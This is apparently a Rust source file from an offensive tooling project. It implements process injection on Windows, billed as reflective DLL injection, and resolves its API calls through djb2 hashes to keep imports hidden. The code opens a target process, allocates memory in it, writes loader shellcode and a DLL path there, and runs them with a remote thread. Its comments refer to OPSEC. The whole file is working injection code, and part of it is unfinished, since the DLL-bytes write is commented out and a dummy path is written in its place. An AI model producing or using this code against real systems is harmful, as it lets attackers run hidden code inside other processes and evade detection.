#[cfg(target_os = "windows")]

use std::error::Error;
use std::ffi::c_void;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use hash_resolver::*;
use djb2macro::djb2;

type FnOpenProcess = fn(u32, bool, u32) -> *mut c_void;
type FnVirtualAllocEx = fn(*mut c_void, *mut c_void, u64, u32, u32) -> *mut c_void;
type FnCloseHandle = fn(*mut c_void) -> bool;
type FnWriteProcessMemory = fn(*mut c_void, *mut c_void, *const c_void, u64, *mut u64) -> bool;
type PthreadStartRoutine = fn(*mut c_void) -> *const u32;
type FnCreateRemoteThread = fn(*mut c_void, *mut SECURITY_ATTRIBUTES, u64, PthreadStartRoutine, *mut c_void, u32, *mut u32) -> *mut c_void;

const PROCESS_VM_WRITE: u32 = 0x0020 as u32;
const PROCESS_CREATE_THREAD: u32 = 0x0002 as u32;
const PROCESS_VM_OPERATION: u32 = 0x0008 as u32;
const MEM_COMMIT: u32 = 0x00001000 as u32;
const PAGE_READWRITE: u32 = 0x04 as u32;

// Perform reflective DLL injection using the provided loader shellcode and DLL bytes
// Reference: https://github.com/stephenfewer/ReflectiveDLLInjection/tree/master/inject
pub unsafe fn reflective_dll_injection(pid: u32, loader_shellcode: &[u8], dll_bytes: &[u8], loader_offset: u32) -> Result<(), Box<dyn Error>> {
    let mut last_error: u32;

    // Get function pointers
    let open_process_ptr: FnOpenProcess = addr_to_func_ptr!(resolve_api(djb2!("OpenProcess"), "Kernel32.dll")?, FnOpenProcess);
    let virtual_alloc_ex_ptr: FnVirtualAllocEx = addr_to_func_ptr!(resolve_api(djb2!("VirtualAllocEx"), "Kernel32.dll")?, FnVirtualAllocEx);
    let write_process_memory_ptr: FnWriteProcessMemory = addr_to_func_ptr!(resolve_api(djb2!("WriteProcessMemory"), "Kernel32.dll")?, FnWriteProcessMemory);
    let create_remote_thread_ptr: FnCreateRemoteThread = addr_to_func_ptr!(resolve_api(djb2!("CreateRemoteThread"), "Kernel32.dll")?, FnCreateRemoteThread);

    // Not for OPSEC, but rather to be able to directly interact with our handle
    let close_handle_ptr: FnCloseHandle = addr_to_func_ptr!(resolve_api(djb2!("CloseHandle"), "Kernel32.dll")?, FnCloseHandle);

    // Get handle to target process
    let h_process: *mut c_void = open_process_ptr(PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION, false, pid);
    if h_process.is_null() {
        Err(format!("Failed to open process ID {}. GetLastError: {}", pid, GetLastError().0))?
    } else {
        println!("Opened handle to process with ID {}", pid);
    }

    // Create buffer in target process memory for the loader shellcode
    let shellcode_buf_size: u64 = (loader_shellcode.len()) as u64;
    let shellcode_buffer = virtual_alloc_ex_ptr(h_process, 0 as *mut c_void, shellcode_buf_size, MEM_COMMIT, PAGE_READWRITE);
    if shellcode_buffer.is_null() {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to create shellcode buffer in target process memory. GetLastError: {}", last_error))?
    } else {
        println!("Created shellcode buffer in target process memory of size {}.", shellcode_buf_size);
    }

    // Create buffer in target process memory for the injected DLL
    let dll_buf_size: u64 = (dll_bytes.len()) as u64;
    let dll_buffer = virtual_alloc_ex_ptr(h_process, 0 as *mut c_void, dll_buf_size, MEM_COMMIT, PAGE_READWRITE);
    if dll_buffer.is_null() {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to create DLL buffer in target process memory. GetLastError: {}", last_error))?
    } else {
        println!("Created DLL buffer in target process memory of size {}.", dll_buf_size);
    }

    // Not for OPSEC, but to get the function address to send to the thread we will later create
    // The address is calculated by adding the loader function offset to the shellcode buffer
    let start_routine: PthreadStartRoutine = addr_to_func_ptr!((shellcode_buffer as isize) + (loader_offset as isize), PthreadStartRoutine);

    // Write DLL and shellcode to their respective buffers
    let mut num_written: u64 = 0;
    if !write_process_memory_ptr(h_process, shellcode_buffer, loader_shellcode.as_ptr() as *const c_void, shellcode_buf_size, &mut num_written) {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to write shellcode to process memory. GetLastError: {}", last_error))?
    } else {
        println!("Wrote shellcode to process memory. Bytes written: {}", num_written);
    }
    /*if !write_process_memory_ptr(h_process, dll_buffer, dll_bytes.as_ptr() as *const c_void, dll_buf_size, &mut num_written) {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to write DLL bytes to process memory. GetLastError: {}", last_error))?
    } else {
        println!("Wrote DLL bytes to process memory. Bytes written: {}", num_written);
    }*/
    // For now, write path to dummy DLL to memory
    let dll_path = b"C:\\Users\\Public\\toinject.dll\0";
    if !write_process_memory_ptr(h_process, dll_buffer, dll_path.as_ptr() as *const c_void, dll_path.len() as u64, &mut num_written) {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to write DLL path to process memory. GetLastError: {}", last_error))?
    } else {
        println!("Wrote DLL path to process memory. Bytes written: {}", num_written);
    }

    // Create remote thread to run loader shellcode and inject the DLL
    // Shellcode function parameter is the memory address of the DLL buffer
    let mut thread_id: u32 = 0;
    let h_thread = create_remote_thread_ptr(h_process, 0 as *mut SECURITY_ATTRIBUTES, 0u64, start_routine, dll_buffer, 0, &mut thread_id);
    if h_thread.is_null() {
        last_error = GetLastError().0;
        close_handle_ptr(h_process);
        Err(format!("Failed to create remote thread in process. GetLastError: {}", last_error))?
    } else {
        println!("Created remote thread with ID {}", thread_id);
    }

    close_handle_ptr(h_process);
    close_handle_ptr(h_thread);

    Ok(())
}
